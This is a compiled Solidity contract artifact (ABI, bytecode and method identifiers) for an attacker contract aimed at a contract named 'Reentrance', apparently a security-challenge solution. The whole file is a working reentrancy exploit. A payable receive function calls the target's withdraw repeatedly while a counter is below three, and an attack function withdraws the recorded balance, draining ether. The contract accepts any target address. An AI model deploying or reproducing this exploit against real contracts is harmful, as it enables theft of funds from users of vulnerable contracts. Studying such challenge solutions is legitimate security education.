{"abi":[{"type":"constructor","inputs":[{"name":"_instance","type":"address","internalType":"address payable"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"count","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"donate","inputs":[{"name":"_amount","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"instance","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract Reentrance"}],"stateMutability":"view"}],"bytecode":{"object":"0x608060405234801561001057600080fd5b506040516104db3803806104db8339818101604052602081101561003357600080fd5b5051600080546001600160a01b039092166001600160a01b0319909216919091179055610476806100656000396000f3fe6080604052600436106100435760003560e01c8063022ec095146100e357806306661abd146101145780639e5faafc1461013b578063f14faf6f14610150576100de565b366100de57600360015410156100dc57600180548101905560008054604080517f2e1a7d4d000000000000000000000000000000000000000000000000000000008152670de0b6b3a7640000600482015290516001600160a01b0390921692632e1a7d4d9260248084019382900301818387803b1580156100c357600080fd5b505af11580156100d7573d6000803e3d6000fd5b505050505b005b600080fd5b3480156100ef57600080fd5b506100f861016d565b604080516001600160a01b039092168252519081900360200190f35b34801561012057600080fd5b5061012961017c565b60408051918252519081900360200190f35b34801561014757600080fd5b506100dc610182565b6100dc6004803603602081101561016657600080fd5b503561028a565b6000546001600160a01b031681565b60015481565b600054604080517f70a0823100000000000000000000000000000000000000000000000000000000815230600482015290516001600160a01b0390921691632e1a7d4d9183916370a0823191602480820192602092909190829003018186803b1580156101ee57600080fd5b505afa158015610202573d6000803e3d6000fd5b505050506040513d602081101561021857600080fd5b5051604080517fffffffff0000000000000000000000000000000000000000000000000000000060e085901b168152600481019290925251602480830192600092919082900301818387803b15801561027057600080fd5b505af1158015610284573d6000803e3d6000fd5b50505050565b8034146102de576040805162461bcd60e51b815260206004820152601760248201527f56616c7565206d757374206d6174636820616d6f756e74000000000000000000604482015290519081900360640190fd5b60008054604080513060248083019190915282518083039091018152604490910182526020810180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff167e362a9500000000000000000000000000000000000000000000000000000000178152915181516001600160a01b0390941693869382918083835b6020831061037f5780518252601f199092019160209182019101610360565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038185875af1925050503d80600081146103e1576040519150601f19603f3d011682016040523d82523d6000602084013e6103e6565b606091505b505090508061043c576040805162461bcd60e51b815260206004820152600f60248201527f446f6e6174696f6e206661696c65640000000000000000000000000000000000604482015290519081900360640190fd5b505056fea26469706673582212201f0e492b5676ae359d29e203b6a5d6f0e7f1e0918622949207090f4d17bb60fb64736f6c634300060c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","count()":"06661abd","donate(uint256)":"f14faf6f","instance()":"022ec095"},"id":1}